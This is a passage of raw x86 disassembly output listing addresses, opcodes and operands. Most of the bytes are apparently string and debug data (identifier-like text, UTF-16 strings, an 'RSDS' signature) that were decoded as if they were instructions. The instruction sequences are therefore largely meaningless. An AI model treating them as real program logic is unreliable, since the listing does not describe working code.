  42a930:	inc    edi
  42a931:	add    BYTE PTR [edx+0x57],dl
  42a934:	xor    ebx,DWORD PTR [edi+0x31]
  42a937:	dec    edx
  42a938:	push   edi
  42a939:	xor    eax,0x4d435f
  42a93e:	dec    ecx
  42a93f:	xor    eax,0x36365f39
  42a944:	dec    eax
  42a945:	xor    BYTE PTR [eax],al
  42a947:	dec    edi
  42a948:	inc    ebx
  42a949:	push   edi
  42a94a:	pop    edi
  42a94b:	inc    edi
  42a94c:	xor    al,BYTE PTR ss:[ecx+esi*1+0x4a]
  42a951:	add    BYTE PTR [edx+0x58],al
  42a954:	inc    edi
  42a955:	ss pop edi
  42a957:	push   esi
  42a958:	inc    ebx
  42a959:	dec    esi
  42a95a:	inc    esp
  42a95b:	add    BYTE PTR [edi+0x4d],cl
  42a95e:	inc    edi
  42a95f:	xor    ebx,DWORD PTR [edi+0x34]
  42a962:	dec    esi
  42a963:	pop    edx
  42a964:	cmp    BYTE PTR [edi+0x58],bl
  42a967:	cmp    BYTE PTR [eax],al
  42a969:	push   edx
  42a96a:	pop    eax
  42a96b:	push   ecx
  42a96c:	pop    edi
  42a96d:	dec    esp
  42a96e:	push   edx
  42a96f:	dec    ecx
  42a970:	dec    edi
  42a971:	inc    esp
  42a972:	pop    edi
  42a973:	dec    edi
  42a974:	xor    eax,DWORD PTR [eax+eax*1+0x43]
  42a978:	push   eax
  42a979:	inc    ebp
  42a97a:	pop    edi
  42a97b:	xor    eax,0x565f3945
  42a980:	add    BYTE PTR [edi+0x4e],al
  42a983:	push   esi
  42a984:	pop    edi
  42a985:	inc    edi
  42a986:	push   esp
  42a987:	dec    eax
  42a988:	xor    dh,BYTE PTR [ecx]
  42a98a:	pop    edi
  42a98b:	dec    edi
  42a98c:	xor    eax,DWORD PTR ss:[eax]
  42a98f:	inc    esp
  42a990:	inc    ebp
  42a991:	dec    ecx
  42a992:	pop    edi
  42a993:	push   edx
  42a994:	dec    eax
  42a995:	xor    al,0x48
  42a997:	dec    ecx
  42a998:	ss pop edi
  42a99a:	aaa    
  42a99b:	aaa    
  42a99c:	dec    ecx
  42a99d:	dec    ebp
  42a99e:	add    BYTE PTR [eax+0x54],cl
  42a9a1:	ss pop edi
  42a9a3:	inc    esi
  42a9a4:	inc    edx
  42a9a5:	xor    dh,BYTE PTR [eax+eax*1]
  42a9a8:	dec    esi
  42a9a9:	ss dec edx
  42a9ab:	pop    edi
  42a9ac:	dec    ecx
  42a9ad:	dec    esp
  42a9ae:	inc    edi
  42a9af:	inc    esp
  42a9b0:	dec    eax
  42a9b1:	xor    BYTE PTR [eax],bh
  42a9b3:	xor    eax,0x4c344f00
  42a9b8:	xor    esi,DWORD PTR [edi]
  42a9ba:	xor    BYTE PTR [edi+0x44],bl
  42a9bd:	inc    edi
  42a9be:	dec    ebx
  42a9bf:	xor    al,BYTE PTR [ecx+0x43]
  42a9c2:	add    BYTE PTR [edi+0x32],cl
  42a9c5:	xor    ebx,DWORD PTR [edi+0x57]
  42a9c8:	xor    cl,BYTE PTR [edi+0x5f]
  42a9cb:	pop    edx
  42a9cc:	add    BYTE PTR [eax+0x4c],bl
  42a9cf:	cmp    DWORD PTR [edi+0x4b],ebx
  42a9d2:	inc    ecx
  42a9d3:	dec    edx
  42a9d4:	inc    esi
  42a9d5:	xor    DWORD PTR [edi+ebx*2],esi
  42a9d8:	pop    eax
  42a9d9:	inc    edi
  42a9da:	inc    edx
  42a9db:	add    BYTE PTR [eax+0x33],dl
  42a9de:	dec    esi
  42a9df:	pop    edi
  42a9e0:	dec    eax
  42a9e1:	xor    eax,0x485f53
  42a9e6:	dec    ebp
  42a9e7:	xor    BYTE PTR [edx+0x5f],al
  42a9ea:	dec    edx
  42a9eb:	pop    eax
  42a9ec:	push   esp
  42a9ed:	dec    ecx
  42a9ee:	dec    esp
  42a9ef:	cmp    DWORD PTR [eax+eax*1+0x41],ecx
  42a9f3:	xor    esi,DWORD PTR [eax]
  42a9f5:	pop    edi
  42a9f6:	inc    ecx
  42a9f7:	pop    edx
  42a9f8:	push   ecx
  42a9f9:	pop    edx
  42a9fa:	cmp    DWORD PTR [esi],esi
  42a9fc:	pop    edi
  42a9fd:	dec    eax
  42a9fe:	dec    esp
  42a9ff:	pop    edx
  42aa00:	add    BYTE PTR [ecx+0x57],dl
  42aa03:	pop    ecx
  42aa04:	pop    edi
  42aa05:	push   esi
  42aa06:	xor    al,0x44
  42aa08:	xor    DWORD PTR [eax],edi
  42aa0a:	xor    bl,BYTE PTR [edi+0x39]
  42aa0d:	push   esp
  42aa0e:	push   esp
  42aa0f:	add    BYTE PTR [esi+0x0],dl
  42aa12:	dec    edi
  42aa13:	add    BYTE PTR [edi+0x0],al
  42aa16:	add    BYTE PTR ss:[edi+0x0],bl
  42aa1a:	dec    edi
  42aa1b:	add    BYTE PTR [edx+0x0],bl
  42aa1e:	inc    ebp
  42aa1f:	add    BYTE PTR [eax],dh
  42aa21:	add    BYTE PTR [ebp+0x0],al
  42aa24:	xor    BYTE PTR [eax],al
  42aa26:	pop    edi
  42aa27:	add    BYTE PTR [eax],dh
  42aa29:	add    BYTE PTR ds:0x4f000000,dh
  42aa2f:	add    BYTE PTR ds:0x5f005700,dh
  42aa35:	add    BYTE PTR [edi],dh
  42aa37:	add    BYTE PTR [ebx+0x0],dl
  42aa3a:	push   ebp
  42aa3b:	add    BYTE PTR [edi+0x0],al
  42aa3e:	xor    al,0x0
  42aa40:	pop    edi
  42aa41:	add    BYTE PTR [ecx+0x0],dl
  42aa44:	inc    esp
  42aa45:	add    BYTE PTR [eax],al
  42aa47:	add    BYTE PTR [edx+0x0],dl
  42aa4a:	push   esp
  42aa4b:	add    BYTE PTR ds:0x52005f00,dh
  42aa51:	add    BYTE PTR [edi+0x0],dl
  42aa54:	xor    al,BYTE PTR [eax]
  42aa56:	xor    al,BYTE PTR [eax]
  42aa58:	xor    BYTE PTR [eax],al
  42aa5a:	xor    BYTE PTR [eax],al
  42aa5c:	pop    edi
  42aa5d:	add    BYTE PTR [esi],dh
  42aa5f:	add    BYTE PTR [eax],al
  42aa61:	add    BYTE PTR [eax+0x0],cl
  42aa64:	inc    ebp
  42aa65:	add    BYTE PTR [eax+eax*1+0x30],cl
  42aa69:	add    BYTE PTR [edi+0x0],bl
  42aa6c:	dec    edx
  42aa6d:	add    BYTE PTR [edx],dh
  42aa6f:	add    BYTE PTR [edi],dh
  42aa71:	add    BYTE PTR [ebp+0x0],dl
  42aa74:	add    BYTE PTR ss:[eax],dh
  42aa77:	add    BYTE PTR [eax],al
  42aa79:	add    BYTE PTR [esi+0x0],dl
  42aa7c:	cmp    BYTE PTR [eax],al
  42aa7e:	dec    edi
  42aa7f:	add    BYTE PTR [ecx],bh
  42aa81:	add    BYTE PTR [edi+0x0],bl
  42aa84:	pop    eax
  42aa85:	add    BYTE PTR [edx+0x0],bl
  42aa88:	dec    esp
  42aa89:	add    BYTE PTR [ebx+0x0],cl
  42aa8c:	add    BYTE PTR [eax],al
  42aa8e:	dec    ecx
  42aa8f:	add    BYTE PTR [ebp+0x0],dl
  42aa92:	dec    edi
  42aa93:	add    BYTE PTR [eax],bh
  42aa95:	add    BYTE PTR [edi+0x0],bl
  42aa98:	inc    esp
  42aa99:	add    BYTE PTR [eax],bh
  42aa9b:	add    BYTE PTR [ecx+0x0],cl
  42aa9e:	dec    eax
  42aa9f:	add    BYTE PTR [edi+0x0],cl
  42aaa2:	pop    edi
  42aaa3:	add    BYTE PTR [ebp+0x0],al
  42aaa6:	pop    eax
  42aaa7:	add    BYTE PTR [eax],al
  42aaa9:	add    BYTE PTR [edx+0x0],dl
  42aaac:	dec    esp
  42aaad:	add    BYTE PTR [esi],dh
  42aaaf:	add    BYTE PTR [edi+0x0],bl
  42aab2:	aaa    
  42aab3:	add    BYTE PTR [eax+0x0],bl
  42aab6:	xor    eax,DWORD PTR [eax]
  42aab8:	inc    edi
  42aab9:	add    BYTE PTR [ecx+0x0],dl
  42aabc:	pop    edi
  42aabd:	add    BYTE PTR [edx+0x0],cl
  42aac0:	add    BYTE PTR [eax],al
  42aac2:	inc    edi
  42aac3:	add    BYTE PTR [edi+0x0],cl
  42aac6:	push   ebx
  42aac7:	add    BYTE PTR [eax+eax*1],dh
  42aaca:	pop    edi
  42aacb:	add    BYTE PTR [ecx+0x0],cl
  42aace:	xor    DWORD PTR [eax],eax
  42aad0:	push   esi
  42aad1:	add    BYTE PTR [ebx],dh
  42aad3:	add    BYTE PTR [edi+0x0],bl
  42aad6:	dec    ecx
  42aad7:	add    BYTE PTR [edx+0x0],bl
  42aada:	add    BYTE PTR [eax],al
  42aadc:	inc    ebx
  42aadd:	add    BYTE PTR [ecx+0x0],bl
  42aae0:	inc    ecx
  42aae1:	add    BYTE PTR [eax],dh
  42aae3:	add    BYTE PTR [ecx],bh
  42aae5:	add    BYTE PTR [edi+0x0],bl
  42aae8:	cmp    DWORD PTR [eax],eax
  42aaea:	push   eax
  42aaeb:	add    BYTE PTR [eax+eax*1],dh
  42aaee:	pop    edx
  42aaef:	add    BYTE PTR [eax],al
  42aaf1:	add    BYTE PTR [edx+0x0],al
  42aaf4:	inc    esi
  42aaf5:	add    BYTE PTR [eax+eax*1+0x5f],dl
  42aaf9:	add    BYTE PTR [ebp+0x0],dl
  42aafc:	push   ebp
  42aafd:	add    BYTE PTR [eax+eax*1+0x57],dl
  42ab01:	add    BYTE PTR [eax],al
  42ab03:	add    BYTE PTR [eax+eax*1+0x37],dl
  42ab07:	add    BYTE PTR [eax+eax*1+0x38],dl
  42ab0b:	add    BYTE PTR [edi+0x0],bl
  42ab0e:	xor    eax,DWORD PTR [eax]
  42ab10:	cmp    DWORD PTR [eax],eax
  42ab12:	dec    eax
  42ab13:	add    BYTE PTR [edi+0x0],bl
  42ab16:	dec    ebp
  42ab17:	add    BYTE PTR [ecx+0x0],bl
  42ab1a:	cmp    DWORD PTR [eax],eax
  42ab1c:	inc    ecx
  42ab1d:	add    BYTE PTR [esi+0x0],cl
  42ab20:	add    BYTE PTR [eax],al
  42ab22:	inc    ebx
  42ab23:	add    BYTE PTR [eax+0x0],dl
  42ab26:	dec    esi
  42ab27:	add    BYTE PTR [eax+eax*1],dh
  42ab2a:	pop    edi
  42ab2b:	add    BYTE PTR [eax+eax*1+0x54],cl
  42ab2f:	add    BYTE PTR [ebx+0x0],cl
  42ab32:	xor    DWORD PTR [eax],eax
  42ab34:	add    BYTE PTR [eax],al
  42ab36:	inc    ecx
  42ab37:	add    BYTE PTR [edi],dh
  42ab39:	add    BYTE PTR [edx+0x0],cl
  42ab3c:	pop    edi
  42ab3d:	add    BYTE PTR [ebx+0x0],al
  42ab40:	cmp    BYTE PTR [eax],al
  42ab42:	push   edi
  42ab43:	add    BYTE PTR [eax+0x0],dl
  42ab46:	pop    edi
  42ab47:	add    BYTE PTR [eax+eax*1+0x4e],cl
  42ab4b:	add    BYTE PTR [edx],dh
  42ab4d:	add    BYTE PTR [eax],al
  42ab4f:	add    BYTE PTR [edx+0x0],al
  42ab52:	add    BYTE PTR [eax],al
  42ab54:	push   edx
  42ab55:	push   ebx
  42ab56:	inc    esp
  42ab57:	push   ebx
  42ab58:	or     al,BYTE PTR [esi-0x23b969ce]
  42ab5e:	add    BYTE PTR [esp+ebx*4-0x26],0x5c
  42ab63:	mov    gs,WORD PTR [eax+0x20]
  42ab66:	push   edi
  42ab67:	add    DWORD PTR [eax+eax*1],ebx
  42ab6a:	add    BYTE PTR [eax],al
  42ab6c:	push   ecx
  42ab6d:	cmp    bl,BYTE PTR [edi+ebp*2+0x51]
  42ab71:	js     0x42abc8
  42ab73:	jbe    0x42abe7
  42ab75:	arpl   WORD PTR [esi+0x75],dx
  42ab78:	popa   
  42ab79:	push   esi
  42ab7a:	pop    esp
  42ab7b:	outs   dx,DWORD PTR ds:[esi]
  42ab7c:	ins    DWORD PTR es:[edi],dx
  42ab7d:	dec    eax
  42ab7e:	inc    edi
  42ab7f:	push   0x6c445178
  42ab84:	jbe    0x42abf7
  42ab86:	pop    esp
  42ab87:	push   0x70
  42ab89:	js     0x42abec
  42ab8b:	ins    BYTE PTR es:[edi],dx
  42ab8c:	ins    BYTE PTR es:[edi],dx
  42ab8d:	dec    eax
  42ab8e:	addr16 pop esp
  42ab90:	push   0x4a
  42ab92:	jb     0x42abf6
  42ab94:	push   esp
  42ab95:	ins    DWORD PTR es:[edi],dx
  42ab96:	push   edx
  42ab97:	bound  eax,QWORD PTR [edi+0x6d]
  42ab9a:	push   eax
  42ab9b:	arpl   WORD PTR [esi+0x77],ax
  42ab9e:	pop    esp
  42ab9f:	jo     0x42ac0b
  42aba1:	dec    ecx
  42aba2:	inc    ebp
  42aba3:	push   bp
  42aba5:	ins    BYTE PTR es:[edi],dx
  42aba6:	inc    ebp
  42aba7:	dec    ebp
  42aba8:	jne    0x42ac21
  42abaa:	jbe    0x42abf5
  42abac:	cs jo  0x42ac13
  42abaf:	bound  eax,QWORD PTR [eax]
	...
